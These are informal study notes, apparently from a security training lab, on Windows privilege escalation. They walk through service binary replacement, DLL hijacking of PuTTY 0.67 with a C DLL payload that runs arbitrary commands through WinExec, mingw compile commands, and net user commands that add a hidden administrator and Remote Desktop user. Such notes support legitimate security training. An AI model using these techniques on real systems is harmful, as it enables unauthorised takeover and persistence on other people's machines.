make sure you have view >> hidden items turnedon
windows privilege escalation
1)-services

view services via task manager or services
 this is what i want from my services:
 -start up type: automatic
 -log on as: local system
 -description: <blank description>
 trusted services, developers will provide a description, run from a trusted directory location, run from a trusted directory location

 -path to executable
 check the path to the service, and check it's permissions
 in the gui find the directory, right click and view properties
 -determine if its writeable, rightclicking inside the directory to see if you can create things
 IF YOU CAN WRITE To IT:
--binary replacement
 1) look at the path to the executable to determine the file name that we are going to replace
 
 putty.exe <<<< we will need to rename out malicious binary to putty.exe to match what is called upon in the path to executable 
 
 2) getting out binary on the machine
 -scp <src file> <dst>
  scp ./malicious_file student@10.50.31.115:C:/putty
  
  rename the legit binary to something else (ie not_putty.exe)
 -python server
  on linux box: python3 -m http.server
  on windows: open firefox and connect to the http://linopsmachine:8000
  
  right click and save to the directory with the legit service, rename the malware to the name of the legit exe, rename the legit to something else
  
 3) getting the malicious binary to execute
 restart the machine
 may need to do it multiple times!
IF YOU CAN'T WRITE TO IT 
--DLL hijacking (if youre struggling to priv ex, prolly need to dll hijack)
make a new folder on desktop called win-priv, navigate to it
google putty 0.67
https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html
in this link: alt binary files > putty.exe
right click save to the directory we made above, rename it it putty.exe if needed

open command prompt as admin:
net use * \\live.sysinternals.com\tools >> press enter 
naviagate to newly made drive Z:
procmon.exe -accepteula
filters >>
process name contains putty include
Result contains NOT include
path contains .dll include
go to google and lookup putty .67 dll vulnerability
https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack.html
https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack-2.html

find the list of vunerability and compare that to the procmon dll that show up after we run putty
putty calls for the these dll but they dont exist, so we can craft them

ON LINOPS:
sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
nano SSPICLI.DLL << the name of the dll that it calls for

#include <windows.h>
int execCommand()
{
 WinExec("cmd /C whoami > FINDME_1.txt", 1);  <<< any command can be executed here
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
###MIGHT NEED TO USE ESCAPE CHAR ON THE "###
#Compile the raw C source code into a unlinked c object
i686-w64-mingw32-gcc -c SSPICLI.c -o SSPICLI.o

#Create the DLL from unlinked c object
i686-w64-mingw32-gcc -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a

copy the .dll over to the same directory that contains the exe on the windows device, using the python3 web server is the easiest method of transportation

restart machine


commands to escalate our privs:::
-add a new user, add them to admin group
and remote desktop group
-add exisiting user to admin group and remote desktop group
    net user << list of users
    net user NewUserBobby password /add << makes a new user
    net localgroup Administrators NewUserBobby /add << adds new user to admin group
    net localgroup Administrators << check list of admin users
    net localgroup "Remote Desktop Users" NewUserBobby /add << add newuser to Remote Desktop group 
    
    YOULL NEED TO BE IN AN ADMIN CMD PROMPT OR JUST USE TO GUI
  2)-schedule tasks
  
task scheduler
general tab > security > SYSTEM
Triggers Tab > Trigger/Details: Desireable (At logon, at startup, at log on of any user, SOMETHING THAT HAPPENS OFTEN)
action tab > action: start a program, detail: <writable directories>
--binary replacement
same as above   
--DLL hijacking
same as above

3)-event log
--requires elevated privileges to look at certain logs (security)
check event viewer >> windows logs >> security
filter current log << search for specific things
save filtered log file as

4)-auditpol (security policies) 
--requires elevated privileges
auditpol /get /category:* << needs privs to view
DONT FUCKING CHECK THE LOCAL SECURITY POLICY, IT'S NOT THE SAME THING
